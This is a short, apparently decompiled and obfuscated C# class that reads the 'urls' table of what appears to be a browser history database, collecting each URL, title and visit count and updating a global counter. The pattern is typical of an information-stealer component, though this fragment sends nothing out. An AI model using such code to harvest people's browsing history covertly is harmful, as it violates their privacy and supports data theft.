using System;
using System.Collections.Generic;
using ns13;

namespace ns12;

internal sealed class Class52
{
	public static List<Struct5> smethod_0(string string_0)
	{
		try
		{
			List<Struct5> list = new List<Struct5>();
			Class58 @class = Class59.smethod_0(string_0, "urls");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct5 item = default(Struct5);
				item.String_1 = Class47.smethod_2(@class.method_0(i, 1));
				item.String_0 = Class47.smethod_2(@class.method_0(i, 2));
				item.Int32_0 = Convert.ToInt32(@class.method_0(i, 3)) + 1;
				Class54.smethod_4(item.String_0);
				Class55.int_4++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<Struct5>();
		}
	}
}
